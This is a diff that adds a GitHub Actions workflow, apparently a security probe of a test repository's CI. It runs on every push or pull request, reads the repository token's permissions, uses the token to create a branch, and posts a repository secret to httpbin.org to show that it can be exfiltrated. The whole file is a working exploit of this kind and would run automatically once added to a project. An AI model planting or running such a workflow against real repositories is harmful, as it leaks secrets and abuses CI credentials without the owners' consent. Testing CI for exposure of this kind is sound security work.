@@ -1,0 +1,25 @@
+name: t38-exec2-probe
+on:
+  push:
+  pull_request:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: recon
+        run: |
+          echo "T38E-EXECUTED event=${{ github.event_name }} ref=$GITHUB_REF actor=$GITHUB_ACTOR sha=$GITHUB_SHA"
+          echo "T38E-CANARY-PRESENT=${{ secrets.T38_CANARY != '' }}"
+          perms=$(curl -sS -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/mergifytest1/test-repo | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('permissions'))")
+          echo "T38E-TOKEN-PERMS=$perms"
+          body=$(printf '{"ref":"refs/heads/t38e-token-proof","sha":"%s"}' "$GITHUB_SHA")
+          wcode=$(curl -sS -o /tmp/ref.json -w '%{http_code}' -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" -d "$body" https://api.github.com/repos/mergifytest1/test-repo/git/refs)
+          echo "T38E-TOKEN-WRITE branch-create http=$wcode"
+          ecode=$(curl -sS -o /tmp/echo.json -w '%{http_code}' -X POST https://httpbin.org/post --data-urlencode "canary=${{ secrets.T38_CANARY }}")
+          echoed=$(grep -c "t38-canary-dummy" /tmp/echo.json || true)
+          echo "T38E-EXFIL http=$ecode canary-seen-in-response=$echoed"
+      - name: fail-on-purpose
+        run: |
+          echo "T38E intentional failure: code already ran before any green check"
+          exit 1
